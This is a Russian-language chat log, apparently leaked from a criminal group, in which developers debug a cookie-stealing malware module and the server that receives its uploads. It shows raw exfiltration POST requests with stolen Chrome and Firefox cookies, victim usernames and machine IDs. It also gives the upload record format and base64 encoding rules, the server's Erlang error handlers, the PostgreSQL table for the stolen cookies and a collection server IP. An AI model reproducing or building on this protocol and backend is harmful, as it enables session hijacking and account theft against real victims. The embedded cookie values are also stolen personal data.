@@ -1,0 +1,341 @@
+Timestamp	From	To	Message
+2021-08-27 13:15:46.094948	ttrr	steller	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
+2021-08-27 13:33:53.539107	steller	ttrr	test
+2021-08-27 13:33:53.540190	ttrr	steller	test
+2021-08-30 14:53:48.796627	ttrr	steller	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
+2021-08-30 14:58:12.337869	steller	ttrr	test
+2021-08-30 14:58:12.358219	ttrr	steller	test
+2021-08-30 14:58:30.430926	steller	ttrr	test
+2021-08-30 14:58:30.432457	ttrr	steller	test
+2021-08-30 15:01:00.270830	steller	ttrr	тест
+2021-08-30 15:01:00.271762	ttrr	steller	тест
+2021-08-30 15:01:18.328350	steller	ttrr	тест
+2021-08-30 15:01:18.331105	ttrr	steller	тест
+2021-08-30 15:09:12.726044	ttrr	steller	ога
+2021-08-30 15:09:12.726605	ttrr	steller	чтобы сюда кодера модуля подтянуть к этому времени
+2021-08-30 15:09:12.727460	ttrr	steller	еще надо в лог писать длину пост данных .. потому что у меня лимит 64 кб
+2021-08-30 15:09:12.728210	ttrr	steller	[19:43:23] <dgh> Там надо посмотреть весь лог, суть в том что должно быть по 8 полей 
+[19:43:39] <dgh> И точно такую же ошибку нам выдавало когда их было больше или меньше 
+[19:43:52] <dgh> И возвращало типа что то Missmatch parametr count 
+[19:43:55] <dgh> В ответе
+2021-08-30 15:09:12.728715	ttrr	steller	таймаут по чтению - 50 секунд
+2021-08-30 15:09:12.728908	ttrr	steller	Это еще можно проверить
+2021-08-30 15:09:12.729247	ttrr	steller	да .. надо логировать ответ сервера .. там 403 может быть с пояснением
+2021-08-30 15:09:12.729654	ttrr	steller	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
+такие колонки должны быть
+2021-08-30 15:09:12.729949	ttrr	steller	у меня может в глазах двоится .. но я насчитал в запросе 15 колонов в пост-дата
+2021-08-30 15:09:12.730415	ttrr	steller	колонок
+2021-08-30 15:09:12.730827	ttrr	steller	Я по этому куску разбил по 8 везде
+2021-08-30 15:09:12.731399	ttrr	steller	Или ты полный лог глядишь
+2021-08-30 15:09:12.731873	ttrr	steller	?
+2021-08-30 15:09:12.732430	ttrr	steller	хотя нет .. 8 )
+2021-08-30 15:09:12.733122	ttrr	steller	То что в лимит уперлось кстати вероятно.
+2021-08-30 15:09:12.733885	ttrr	steller	короче надо ответ сервера логировать . будет понятнее . .есть такая возможсность ? )
+2021-08-30 15:09:12.734107	ttrr	steller	Тоже
+2021-08-30 15:09:12.734683	ttrr	steller	и размер запроса
+2021-08-30 15:09:12.735307	ttrr	steller	свалил )
+2021-08-30 15:09:12.735805	ttrr	steller	сейчас автор модуля должен зайти
+2021-08-30 15:09:35.350028	steller	ttrr	Готово
+2021-08-30 15:09:35.353552	ttrr	steller	Готово
+2021-08-30 15:15:06.286263	steller	ttrr	
+» [ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
+Разработчик админки ещё планирует 2 поля в конец добавить: Secure, HttpOnly
+2021-08-30 15:15:06.291437	ttrr	steller	
+» [ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
+Разработчик админки ещё планирует 2 поля в конец добавить: Secure, HttpOnly
+2021-08-31 08:22:38.433141	ttrr	steller	ну и ?
+2021-08-31 08:22:38.434105	ttrr	steller	одному мне больше всез надо ?
+2021-08-31 08:22:38.434949	ttrr	steller	со вчера вечера что-то писали тут?
+2021-08-31 08:23:54.170050	ttrr	steller	zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком
+2021-08-31 08:24:17.348182	steller	ttrr	А тут истории нет?
+Писал по поводу новых полей в записи куки
+2021-08-31 08:24:17.352436	ttrr	steller	А тут истории нет?
+Писал по поводу новых полей в записи куки
+2021-08-31 08:24:26.070109	ttrr	steller	нету истории
+2021-08-31 08:26:45.180535	ttrr	steller	ну так на чем остановились?
+2021-08-31 08:27:19.304152	ttrr	steller	я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так
+2021-08-31 08:27:38.957615	ttrr	steller	а я попросил расширить лог . чтобы логировало ответ
+2021-08-31 08:27:51.223612	ttrr	steller	и размер запроса
+2021-08-31 08:29:36.044035	ttrr	steller	а ты steller ?
+2021-08-31 08:31:18.947529	steller	ttrr	Писал по поводу новых полей в записи куки
+2021-08-31 08:31:18.950254	ttrr	steller	Писал по поводу новых полей в записи куки
+2021-08-31 08:33:03.543013	ttrr	steller	что именно?
+2021-08-31 08:33:15.472946	steller	ttrr	403 встречалась раньше ошибка
+-----------CJLVIYOINTQPMYSU
+Content-Disposition: form-data; name="data"
+
+user|Chrome|.google.com|ANID|	djEw171ep2SDF+UMAcWRRWBcsbp5H34/V0frREuTTKAE2F3BXw3fVVHhgYgcKidlSSPxtTs32WPiqcV/p021G67RLpNXgRDrMqljrJ16Ml1Ckwz2a2URAQ==|1588241125|1651313125|/
+user|Chrome|.register.com|__utma|	djEwnpzEp2a3+eOKByaEj0nLtLL7HGvIusWq1obAuia9wTCz3pPEUF6A+gFpZ3LHPf2GSueVelCwgrXMR96kV8MmLcClokQ=|1588241143|1651313173|/
+
+-----------CJLVIYOINTQPMYSU
+Content-Disposition: form-data; name="source"
+
+Chrome cookies
+-----------CJLVIYOINTQPMYSU--
+
+403
+Mismatch parameters count!
+2021-08-31 08:33:15.477059	ttrr	steller	403 встречалась раньше ошибка
+-----------CJLVIYOINTQPMYSU
+Content-Disposition: form-data; name="data"
+
+user|Chrome|.google.com|ANID|	djEw171ep2SDF+UMAcWRRWBcsbp5H34/V0frREuTTKAE2F3BXw3fVVHhgYgcKidlSSPxtTs32WPiqcV/p021G67RLpNXgRDrMqljrJ16Ml1Ckwz2a2URAQ==|1588241125|1651313125|/
+user|Chrome|.register.com|__utma|	djEwnpzEp2a3+eOKByaEj0nLtLL7HGvIusWq1obAuia9wTCz3pPEUF6A+gFpZ3LHPf2GSueVelCwgrXMR96kV8MmLcClokQ=|1588241143|1651313173|/
+
+-----------CJLVIYOINTQPMYSU
+Content-Disposition: form-data; name="source"
+
+Chrome cookies
+-----------CJLVIYOINTQPMYSU--
+
+403
+Mismatch parameters count!
+2021-08-31 08:33:43.140664	ttrr	steller	zulas: сколько полей в куки у тебя сейчас?
+steller: а у тебя?
+2021-08-31 08:34:59.534959	ttrr	steller	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
+2021-08-31 08:35:00.850965	ttrr	steller	вот поля
+2021-08-31 08:35:14.269229	ttrr	steller	разделитель |
+2021-08-31 08:35:28.659241	steller	ttrr	Разработчик админки планирует добавить 2 поля secure, httponly в конец записи.
+Сейчас:
+Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path
+2021-08-31 08:35:28.667394	ttrr	steller	Разработчик админки планирует добавить 2 поля secure, httponly в конец записи.
+Сейчас:
+Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path
+2021-08-31 08:35:46.677128	ttrr	steller	разделители строк: [ <<10>>, <<13,10>>]
+2021-08-31 08:37:31.163509	steller	ttrr	403 была, когда некоторые поля не кодировались в В64. В отстойнике они безусловно декодировались.
+2021-08-31 08:37:31.168880	ttrr	steller	403 была, когда некоторые поля не кодировались в В64. В отстойнике они безусловно декодировались.
+2021-08-31 08:38:28.741350	steller	ttrr	А что по поводу максимального размера данных, он ограничен 64КБ будет?
+2021-08-31 08:38:28.754283	ttrr	steller	А что по поводу максимального размера данных, он ограничен 64КБ будет?
+2021-08-31 08:39:10.942106	ttrr	steller	{read_length, 64000},
+{read_timeout, 50000}
+я могу и больше сделать
+2021-08-31 08:39:15.179828	ttrr	steller	таковы требоания были
+2021-08-31 08:40:40.546258	ttrr	steller	50000 это в миллисекундах
+2021-08-31 08:43:47.765856	steller	ttrr	В модуле нет такого ограничения. Можно разбить на несколько запросов, в принципе.
+А какие ошибки отстойник может отдавать? Их желательно как-то обрабатывать.
+403 добавил в обработку. На модуль приходили ещё 404 и 500. 500, видимо, от прокладки.
+2021-08-31 08:43:47.770832	ttrr	steller	В модуле нет такого ограничения. Можно разбить на несколько запросов, в принципе.
+А какие ошибки отстойник может отдавать? Их желательно как-то обрабатывать.
+403 добавил в обработку. На модуль приходили ещё 404 и 500. 500, видимо, от прокладки.
+2021-08-31 08:45:02.925652	ttrr	steller	при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?
+2021-08-31 08:45:20.941876	ttrr	steller	403 ошибка формата данных?
+2021-08-31 08:45:42.351035	ttrr	steller	просо 200 бывает без /1/ ?
+2021-08-31 08:45:46.772014	ttrr	steller	просто
+2021-08-31 08:46:17.062726	steller	ttrr	zulas:
+2021-08-31 08:46:17.066281	ttrr	steller	zulas:
+2021-08-31 08:47:07.171079	ttrr	steller	зачем этот /1/ ?
+2021-08-31 08:47:10.011646	ttrr	steller	reply(not_found, Req) ->
+ { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
+ Req1;
+
+reply(forbidden, Req) ->
+ { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
+ Req1;
+
+reply(missing_data, Req) ->
+ { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
+ Req1;
+
+reply(missing_keys, Req) ->
+ { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
+ Req1;
+
+reply(missing_parameters, Req) ->
+ {ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
+ Req1;
+
+reply(request_timeout, Req) ->
+ {ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
+ Req1;
+2021-08-31 08:47:16.137269	ttrr	steller	вот такие ошибки бывают
+2021-08-31 08:47:22.019182	ttrr	steller	текст у вас отобразился ?
+2021-08-31 08:47:26.446357	ttrr	steller	зачем этот /1/ ?
+2021-08-31 08:47:26.450862	ttrr	steller	reply(not_found, Req) ->
+ { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
+ Req1;
+
+reply(forbidden, Req) ->
+ { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
+ Req1;
+
+reply(missing_data, Req) ->
+ { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
+ Req1;
+
+reply(missing_keys, Req) ->
+ { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
+ Req1;
+
+reply(missing_parameters, Req) ->
+ {ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
+ Req1;
+
+reply(request_timeout, Req) ->
+ {ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
+ Req1;
+2021-08-31 08:47:26.451645	ttrr	steller	вот такие ошибки бывают
+2021-08-31 08:47:26.452167	ttrr	steller	текст у вас отобразился ?
+2021-08-31 08:47:31.374804	ttrr	steller	а то у меня пиджин -- и нифига
+2021-08-31 08:47:40.869820	ttrr	steller	отразился
+2021-08-31 08:48:11.907950	ttrr	steller	200 бывает без /1/ ?
+2021-08-31 08:48:50.546255	ttrr	steller	по коду вроде не бывает
+2021-08-31 08:48:57.443844	ttrr	steller	почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?
+2021-08-31 08:49:06.640957	ttrr	steller	[11:47:07] <hof> зачем этот /1/ ?
+так по тз
+2021-08-31 08:49:25.812565	ttrr	steller	это типа следующая команда для клиента
+2021-08-31 08:49:29.557836	ttrr	steller	т.е. 200 без /1/ не бывает?
+2021-08-31 08:49:55.934733	ttrr	steller	не бывает
+2021-08-31 08:50:06.570101	ttrr	steller	ок, отлично
+2021-08-31 08:50:53.717108	steller	ttrr	zulas: А сейчас логирование запросов http есть, их можно проверить?
+2021-08-31 08:50:53.720196	ttrr	steller	zulas: А сейчас логирование запросов http есть, их можно проверить?
+2021-08-31 08:51:29.472149	ttrr	steller	есть
+2021-08-31 08:52:48.113808	steller	ttrr	Скинь тогда проблемные запросы.
+2021-08-31 08:52:48.119344	ttrr	steller	Скинь тогда проблемные запросы.
+2021-08-31 08:58:25.520820	ttrr	steller	2021-08-31 11:52:22.415 [info] <0.6857.3> Data: <<"POST /tot57/WIN-U4U2CDE99LP_W617601.8C95D48B33FF1976677889D52ABB8859/84/ HTTP/1.0\r\nHost: 203.76.105.227\r\nX-Real-IP: 203.76.105.227\r\nX-Forwarded-For: 203.76.105.227\r\nConnection: close\r\nContent-Length: 11059\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=---------MOBMWAMXGTKVMATK\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\r\nCache-Control: no-cache\r\n\r\n-----------MOBMWAMXGTKVMATK\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L2NvbXBsZXRlL3NlYXJjaA==\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L3NlYXJjaA==\r\nAdministrador|C...">>
+ State: {state,#Port<0.108426>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630399947415}
+ ReqEmpty 0
+2021-08-31 11:52:22.416 [critical] <0.6857.3>@http_handler:handle:33 Error {badmatch,false} [{base64,decode_binary,2,[{file,"base64.erl"},{line,212}]},{http_handler,'-save84/3-fun-4-',5,[{file,"src/http_handler.erl"},{line,329}]},{lists,foreach,2,[{file,"lists.erl"},{line,1338}]},{http_handler,save84,3,[{file,"src/http_handler.erl"},{line,325}]},{http_handler,handle,2,[{file,"src/http_handler.erl"},{line,30}]},{cowboy_handler,handler_handle,4,[{file,"src/cowboy_handler.erl"},{line,111}]},{cowboy_protocol,execute,4,[{file,"src/cowboy_protocol.erl"},{line,443}]}]
+2021-08-31 08:58:38.142764	ttrr	steller	вот . не может басе64 декодировать
+2021-08-31 08:58:42.754132	ttrr	steller	не знаю какое поле
+2021-08-31 08:59:10.717203	ttrr	steller	крашей больше нет
+2021-08-31 08:59:29.608597	ttrr	steller	всмысли тех что хттп2
+2021-08-31 09:05:10.041653	steller	ttrr	Это старые данные. Сейчас модуль отправляет Username, Domain, Cookie_name, Cookie_value, Path  в В64
+2021-08-31 09:05:10.044616	ttrr	steller	Это старые данные. Сейчас модуль отправляет Username, Domain, Cookie_name, Cookie_value, Path  в В64
+2021-08-31 09:05:45.411661	ttrr	steller	[ Group, IdLow, IdHigh, base64:decode(Username), Browser, Domain, base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path) ]);
+
+вот 4 поля декодируются только
+2021-08-31 09:05:49.216827	ttrr	steller	надо все ?
+2021-08-31 09:07:35.424938	steller	ttrr	Нужно домен ещё декодировать
+2021-08-31 09:07:35.427984	ttrr	steller	Нужно домен ещё декодировать
+2021-08-31 09:08:11.259343	ttrr	steller	ок .. добавил в новых версиях .
+2021-08-31 09:09:24.731328	ttrr	steller	<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">> [<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]
+2021-08-31 11:52:59.108 [error] <0.6879.3>@db:transform:58 Error {error,error,<<"22021">>,<<"invalid byte sequence for encoding \"UTF8\": 0x95">>,[]} with query {<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">>,[<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]}
+
+есть еще такое
+2021-08-31 09:09:32.432761	ttrr	steller	на УТФ-8 не походит кодировка
+2021-08-31 09:09:59.452667	steller	ttrr	И ещё нужно 2 поля добавить в конец записи.
+secure, httponly
+Значения: 0 & 1
+2021-08-31 09:09:59.455285	ttrr	steller	И ещё нужно 2 поля добавить в конец записи.
+secure, httponly
+Значения: 0 & 1
+2021-08-31 09:10:00.430154	ttrr	steller	насколько я понимаю это про <<149,166,247>>
+2021-08-31 09:10:26.179486	ttrr	steller	в таблицу колонки ?
+2021-08-31 09:10:55.305491	steller	ttrr	Да, в запись поле, в таблицу колонки.
+2021-08-31 09:10:55.306197	ttrr	steller	Да, в запись поле, в таблицу колонки.
+2021-08-31 09:11:43.254940	steller	ttrr	А юникод в каком поле не проходит?
+2021-08-31 09:11:43.258138	ttrr	steller	А юникод в каком поле не проходит?
+2021-08-31 09:20:09.638982	ttrr	steller	,<<149,166,247>> я думаю вот это не может быть юникодом
+2021-08-31 09:20:45.227130	ttrr	steller	юзернейм
+2021-08-31 09:22:08.340946	steller	ttrr	Похоже, пользователь. Скорее всего модуль не отправляет UTF8. Нужно проверить.
+А ты можешь в readme этот формат добавить + описание ошибок?
+Мы уже много времени потратили на поиск этих ошибок из-за отсутствия описания протокола обмена.
+2021-08-31 09:22:08.346737	ttrr	steller	Похоже, пользователь. Скорее всего модуль не отправляет UTF8. Нужно проверить.
+А ты можешь в readme этот формат добавить + описание ошибок?
+Мы уже много времени потратили на поиск этих ошибок из-за отсутствия описания протокола обмена.
+2021-08-31 09:23:06.134832	ttrr	steller	формат чего ?
+2021-08-31 09:23:49.263222	ttrr	steller	в каталог doc есть некоторое описалово
+2021-08-31 09:23:54.882664	steller	ttrr	Кукисов, например. Ещё бы хорошо остальные данные проверить.
+2021-08-31 09:23:54.886365	ttrr	steller	Кукисов, например. Ещё бы хорошо остальные данные проверить.
+2021-08-31 09:24:07.883915	steller	ttrr	Там кукисы описаны?
+2021-08-31 09:24:07.889070	ttrr	steller	Там кукисы описаны?
+2021-08-31 09:24:16.335967	ttrr	steller	какие кукисы ?
+2021-08-31 09:24:39.283767	steller	ttrr	Куки, печенюшки
+2021-08-31 09:24:39.286371	ttrr	steller	Куки, печенюшки
+2021-08-31 09:24:57.066231	ttrr	steller	я понял что такое куки, но к чему ты это говоришь ?
+2021-08-31 09:25:05.867647	ttrr	steller	1. Создать новую команду для получения данных куки. Например, код команды 84
+
+2. Создать таблицу для хранения данных (псевдокод SQL):
+CREATE TABLE cookies (
+  id SERIAL,
+  username VARCHAR(255),
+  browser VARCHAR(255)
+  domain VARCHAR(255)
+  cookie_name VARCHAR(255)
+  cookie_value VARCHAR(255)
+  created DATETIME,
+  expires DATETIME,
+  path VARCHAR(255)
+);
+
+3. Обеспечить прием данных в следующем формате:
+- простой текст, разделенный на строки.
+Разделитель строк - может быть как UNIX, так и DOS.
+Одна строка - одна запись.
+Разделитель полей в записи - вертикальная черта |
+Формат записи:
+
+username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n
+
+где
+
+username     - имя пользователя
+browser      - код броузера (enum = chrome|ff|ie|edge)
+domain       - домен куки
+cookie_name  - имя куки
+cookie_value - значение куки
+created      - дата-время создания, Unix time
+expires      - дата-время истечения, Unix time
+path         - путь URI
+2021-08-31 09:26:49.562426	steller	ttrr	К тому, что у меня не было этого дока. Где описание В64? Это часть формата.
+2021-08-31 09:26:49.564843	ttrr	steller	К тому, что у меня не было этого дока. Где описание В64? Это часть формата.
+2021-08-31 09:28:37.290590	ttrr	steller	нету про базе64 .. сами добавили очевидно
+2021-08-31 09:28:51.260588	ttrr	steller	чтобы экранировать символы
+2021-08-31 09:29:50.573071	steller	ttrr	Ну, вот это и нужно в доку добавить.
+created у нас в секундах?
+2021-08-31 09:29:50.579209	ttrr	steller	Ну, вот это и нужно в доку добавить.
+created у нас в секундах?
+2021-08-31 09:30:27.365537	ttrr	steller	created_at я ставлю сам как NOW()
+2021-08-31 09:30:36.629816	steller	ttrr	Не догадываться же, как там отстойник обрабатывает, верно?
+2021-08-31 09:30:36.635220	ttrr	steller	Не догадываться же, как там отстойник обрабатывает, верно?
+2021-08-31 09:31:00.362275	ttrr	steller	а .есть другой ..
+2021-08-31 09:31:02.579975	ttrr	steller	щас посмотрю
+2021-08-31 09:31:21.646386	steller	ttrr	А NOW() в секундах?
+2021-08-31 09:31:21.649113	ttrr	steller	А NOW() в секундах?
+2021-08-31 09:32:35.414623	ttrr	steller	забей на NOW() это другое
+2021-08-31 09:36:27.499972	ttrr	steller	CREATE TABLE public.data84 (
+    id_low bigint NOT NULL,
+    id_high bigint NOT NULL,
+    "group" character varying(64),
+    created_at timestamp without time zone,
+    username text,
+    browser text,
+    domain text,
+    cookie_name text,
+    cookie_value text,
+    created text,
+    expires text,
+    path text
+);
+2021-08-31 09:36:31.364266	ttrr	steller	вот таблица
+2021-08-31 09:36:37.404037	ttrr	steller	created - просто текст
+2021-08-31 09:36:41.634723	steller	ttrr	нету про базе64 .. сами добавили очевидно 
+Ну, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.
+2021-08-31 09:36:41.643538	ttrr	steller	нету про базе64 .. сами добавили очевидно 
+Ну, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.
+2021-08-31 09:36:43.348282	ttrr	steller	всё - просто текст
+2021-08-31 09:37:34.039861	ttrr	steller	> У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.  
+очевидно не я один это добавлял и не только на моей стороне, иначе не работало бы.
+коду уже 5 лет
+2021-08-31 09:39:30.943462	steller	ttrr	Ну, это тоже не очевидно)
+По факту ошибки посыпались. Документация не полная.
+2021-08-31 09:39:30.947734	ttrr	steller	Ну, это тоже не очевидно)
+По факту ошибки посыпались. Документация не полная.
+2021-08-31 09:41:31.314654	ttrr	steller	где же ты был )
+2021-08-31 10:40:22.322792	ttrr	steller	Zulas ты под новые поля базу тоже будешь менять?
+Если да то просьба этого не делать, я веду миграции и хотелось бы чтобы все изменения в базе в них были отражены.
+2021-08-31 10:40:58.854756	ttrr	steller	Я написал миграции под два поля secure и httponly
+2021-08-31 10:41:19.037337	ttrr	steller	Оба логических.
+2021-08-31 10:41:50.953214	ttrr	steller	не буду делать .
+2021-08-31 10:41:53.240410	ttrr	steller	и в 90 команду добавились новые поля
+2021-08-31 10:42:06.310642	ttrr	steller	ты базу на рабочем уже поменял ?я могу слить дамп ?
+2021-08-31 10:42:24.070393	ttrr	steller	поля не будут сохраняться, если их больше?
+2021-08-31 10:42:41.758802	ttrr	steller	dlls, programs, services Я тоже уже добавил
+2021-08-31 10:42:55.647674	ttrr	steller	а, ок
+2021-08-31 10:42:55.698541	ttrr	steller	Пока не накатил, сек сделаю
+2021-08-31 10:44:25.980940	ttrr	steller	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
+2021-08-31 10:44:38.110043	ttrr	steller	И в бэке его тоже вроде как нет
+2021-08-31 10:44:40.986691	ttrr	steller	добавляй сразу всё чтобы мне не возвращаться
+2021-08-31 10:46:16.070850	ttrr	steller	Пока не смогу. Ближе к вечеру время появится.
+Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
+2021-08-31 11:01:29.530116	ttrr	steller	По 2м полям в куках накатил миграции.
